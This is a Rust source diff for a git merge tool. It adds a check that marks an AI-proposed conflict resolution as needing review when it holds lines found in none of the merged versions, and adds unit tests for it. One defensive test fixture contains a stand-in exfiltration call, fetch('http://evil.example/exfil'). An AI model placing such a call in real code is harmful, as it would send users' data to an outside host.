@@ -4,6 +4,7 @@
 //! caller's separate `resolve_conflict_text` step (P12), so ProposeReview holds
 //! the bytes before touching disk. Pure git2 + `crate::ai`, no Tauri types. (P13)
 
+use std::collections::HashSet;
 use std::path::Path;
 
 use crate::ai::{self, RunOpts};
@@ -40,6 +41,12 @@ pub struct AiResolveProposal {
     pub path: String,
     pub proposed_text: String,
     pub cost_usd: Option<f64>,
+    /// P68 #7 / H1: `true` ⇒ the body has ≥1 non-blank line present in NO version of
+    /// base/ours/theirs, so `settleBatch` demotes it to *needs review* and never
+    /// auto-stages it under `autoResolve`. A property of body-vs-sides, so it is
+    /// autonomy-INDEPENDENT; autonomy decides only what the frontend does with it.
+    /// Serialized `needsReview`.
+    pub needs_review: bool,
 }
 
 /// The three index stages plus the marker view of ONE conflicted path, already
@@ -49,8 +56,13 @@ pub struct AiResolveProposal {
 /// and the streaming/bulk runner ([`super::ai_resolve_stream`]) read a conflict
 /// exactly ONE way — a second copy of the stage-1/2/3 walk is how the two would
 /// silently drift.
+///
+/// `pub` (was `pub(crate)`) since P68 #7 / H1: the authoritative
+/// `ai_apply_resolution` command in `src-tauri` re-reads the sides through
+/// [`read_conflict_sides`] and feeds them to [`resolution_is_novel`], both of which
+/// name this type across the crate boundary.
 #[derive(Debug, Clone)]
-pub(crate) struct ConflictSides {
+pub struct ConflictSides {
     /// Repo-relative path, as `get_conflict` reports it (forward slashes).
     pub path: String,
     pub kind: ConflictKind,
@@ -62,6 +74,39 @@ pub(crate) struct ConflictSides {
     pub theirs: String,
     /// The worktree body, WITH conflict markers.
     pub conflicted: String,
+}
+
+/// True iff `proposed` has ≥1 non-blank line whose NORMALIZED form appears in NONE
+/// of base/ours/theirs (P68 #7 / H1). Per-file verdict (not per-line). Pure — the
+/// allowed set is built from the three sides already held. The [`ABSENT`] sentinel
+/// contributes only the literal "(absent)" line and is harmless.
+///
+/// Normalization (justified in the contract): split with [`str::lines`] — which
+/// splits on `\n` AND strips a trailing `\r`, so CRLF vs LF is never a false
+/// positive — then `line.trim()` (leading/trailing whitespace only), skipping blank
+/// lines on BOTH sides. TRIM-ONLY on purpose: a reindent or trailing-whitespace
+/// change only touches leading/trailing whitespace, so it is not flagged; but we do
+/// NOT collapse interior whitespace, lowercase, or tokenize, since any of those would
+/// let an injected payload line alias an innocuous allowed line while carrying
+/// different bytes (evasion).
+///
+/// `pub` so the authoritative `ai_apply_resolution` command (a separate crate) and
+/// the streaming batch classifier (same crate) call ONE predicate and cannot
+/// disagree.
+pub fn resolution_is_novel(sides: &ConflictSides, proposed: &str) -> bool {
+    let mut allowed: HashSet<&str> = HashSet::new();
+    for side in [sides.base.as_str(), sides.ours.as_str(), sides.theirs.as_str()] {
+        for line in side.lines() {
+            let norm = line.trim();
+            if !norm.is_empty() {
+                allowed.insert(norm);
+            }
+        }
+    }
+    proposed.lines().any(|line| {
+        let norm = line.trim();
+        !norm.is_empty() && !allowed.contains(norm)
+    })
 }
 
 /// Read + guard one conflicted path (P68 §6.1; the P13 body of
@@ -79,7 +124,11 @@ pub(crate) struct ConflictSides {
 ///
 /// Errors: `aiFailed` (ineligible) | `git` (path not conflicted) |
 /// `invalidName` (traversal).
-pub(crate) fn read_conflict_sides(workdir: &Path, path: &str) -> Result<ConflictSides, AppError> {
+///
+/// `pub` (was `pub(crate)`) since P68 #7 / H1: the authoritative
+/// `ai_apply_resolution` command (a separate crate) re-reads the sides here before
+/// gating, so it never trusts a frontend-passed flag.
+pub fn read_conflict_sides(workdir: &Path, path: &str) -> Result<ConflictSides, AppError> {
     // Same guard as `resolve_conflict` — no absolute/.. escapes — BEFORE
     // `get_conflict` (which does not validate), so a traversal path is a clear
     // `invalidName` rather than a confusing "has no conflict".
@@ -195,6 +244,7 @@ pub fn ai_resolve_conflict(
     )?;
 
     Ok(AiResolveProposal {
+        needs_review: resolution_is_novel(&sides, &result.text),
         path: sides.path,
         proposed_text: result.text,
         cost_usd: result.cost_usd,
@@ -237,6 +287,7 @@ mod tests {
             path: "src/auth.ts".to_string(),
             proposed_text: "merged body\n".to_string(),
             cost_usd: Some(0.012),
+            needs_review: false,
         })
         .expect("json");
         assert_eq!(
@@ -244,7 +295,8 @@ mod tests {
             serde_json::json!({
                 "path": "src/auth.ts",
                 "proposedText": "merged body\n",
-                "costUsd": 0.012
+                "costUsd": 0.012,
+                "needsReview": false
             })
         );
 
@@ -252,11 +304,73 @@ mod tests {
             path: "a.txt".to_string(),
             proposed_text: "x".to_string(),
             cost_usd: None,
+            needs_review: true,
         })
         .expect("json");
         assert_eq!(
             v,
-            serde_json::json!({ "path": "a.txt", "proposedText": "x", "costUsd": null })
+            serde_json::json!({
+                "path": "a.txt",
+                "proposedText": "x",
+                "costUsd": null,
+                "needsReview": true
+            })
         );
+    }
+
+    fn sides(base: &str, ours: &str, theirs: &str) -> ConflictSides {
+        ConflictSides {
+            path: "src/a.ts".to_string(),
+            kind: ConflictKind::BothModified,
+            base: base.to_string(),
+            ours: ours.to_string(),
+            theirs: theirs.to_string(),
+            conflicted: String::new(),
+        }
+    }
+
+    /// A resolution that only RECOMBINES existing lines (picks/keeps whole lines
+    /// from either side) is the overwhelmingly common case and is never flagged.
+    #[test]
+    fn novel_recombination_is_not_flagged() {
+        let s = sides("base\n", "let a = 1;\nlet b = 2;\n", "let a = 1;\nlet c = 3;\n");
+        // Interleave of ours + theirs lines — every line came from a side.
+        let proposed = "let a = 1;\nlet b = 2;\nlet c = 3;\n";
+        assert!(!resolution_is_novel(&s, proposed));
+    }
+
+    /// One line present in NO side flags the whole file (per-file verdict).
+    #[test]
+    fn injected_line_is_flagged() {
+        let s = sides("base\n", "let a = 1;\n", "let a = 1;\nlet b = 2;\n");
+        let proposed = "let a = 1;\nlet b = 2;\nfetch('http://evil.example/exfil');\n";
+        assert!(resolution_is_novel(&s, proposed));
+    }
+
+    /// Reindentation and CRLF↔LF only touch leading/trailing whitespace, which
+    /// `trim` + `str::lines` remove — so a legitimate reindent is NOT flagged.
+    #[test]
+    fn reindent_and_crlf_are_not_flagged() {
+        let s = sides("base\n", "if (x) {\n    doThing();\n}\n", "if (x) {\n    doOther();\n}\n");
+        // Same lines, re-indented AND with `\r\n` endings.
+        let proposed = "if (x) {\r\n        doThing();\r\n        doOther();\r\n}\r\n";
+        assert!(!resolution_is_novel(&s, proposed));
+    }
+
+    /// Blank lines are never novel and never contribute to the allowed set.
+    #[test]
+    fn blank_lines_never_novel() {
+        let s = sides("base\n", "a\nb\n", "a\nc\n");
+        let proposed = "a\n\n\nb\n\nc\n\n";
+        assert!(!resolution_is_novel(&s, proposed));
+    }
+
+    /// `bothAdded` (base absent → the "(absent)" sentinel) resolving from ours/theirs
+    /// is harmless: the sentinel contributes only the literal "(absent)" line.
+    #[test]
+    fn absent_sentinel_side_is_harmless() {
+        let s = sides(ABSENT, "line one\n", "line two\n");
+        let proposed = "line one\nline two\n";
+        assert!(!resolution_is_novel(&s, proposed));
     }
 }
